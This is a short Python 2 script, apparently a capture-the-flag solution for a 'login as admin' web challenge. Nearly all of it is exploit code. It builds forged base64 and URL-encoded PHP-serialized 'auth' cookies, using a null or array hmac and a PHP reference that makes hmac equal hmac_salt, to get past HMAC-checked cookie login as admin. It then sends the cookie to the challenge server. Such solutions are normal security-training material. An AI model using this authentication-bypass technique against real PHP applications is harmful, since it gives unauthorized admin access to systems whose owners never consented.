import requests
import hashlib
import hmac
import base64
import phpserialize

if __debug__:
    url = "http://loginasadmin1.cebrusfs.com"
else:
    url = "http://www.csie.ntu.edu.tw/~b99902063/index.php"

username = 'admin'
password = 'test'
key = '123'

salt = hashlib.sha512()
salt.update('a'*32)
hmac_salt = salt.hexdigest()

hmac = hmac.new(key, username + hmac_salt + password, hashlib.sha512).hexdigest()

obj = {
        'username'  :   ['admin'],
        'password'  :   ['x'],
        'hmac'      :   None,
        'hmac_salt' :   ['x']
        }
cookie = base64.b64encode(phpserialize.dumps(obj))
print cookie

payload = {
            'user'  :   'admin',
            'pass'  :   '123'
            }

#cookie = "YTo0OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7czo0OiJobWFjIjtzOjEyODoiMWU2YWIzNmE5YzYxNjEyODEyYjk3ZDNlNGRkNTdjNTJiYzI3YzEwYmM3NmRiNzZjMGIzZmI4NTY5MDZlNDhjM2YzMTEyYWQ5OWY3ODdmYzU0OTRmNTI2NDNlYmY5MzNmNmVhMzhjZTQ1MjZkNjE2MDQxNzRiNWFiNDA4YTEwODIiO3M6OToiaG1hY19zYWx0IjtzOjEyODoiMWE3YTJiNDNkOTUxYWFlMGQ0ZTJhYTk1YmNkNzY4ZDc0YmZjNzJhNjdiZDVmODAyNTg3YjI3OGY3MjNjYzI1NjgwZTFlMDkxMjhiNzZkN2Y1ZjVlODhmNGNiMGJlZTUzZmQ2ZmQwOGMxNDYzM2M5M2I1ZjI4ZDc2ODdjOTJjNzAiO30"
cookie = "a%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22%3F%3F%3F%22%3Bs%3A4%3A%22hmac%22%3Bs%3A33%3A%22https%3A%2F%2Fgithub.com%2Fctfs%2Fwrite-ups%22%3Bs%3A9%3A%22hmac_salt%22%3BR%3A4%3B%7D"
cookies = {
            'auth'  :   cookie
        }
#r = requests.post(url, data=payload, headers=headers)
r = requests.get(url, cookies=cookies)
print r.text
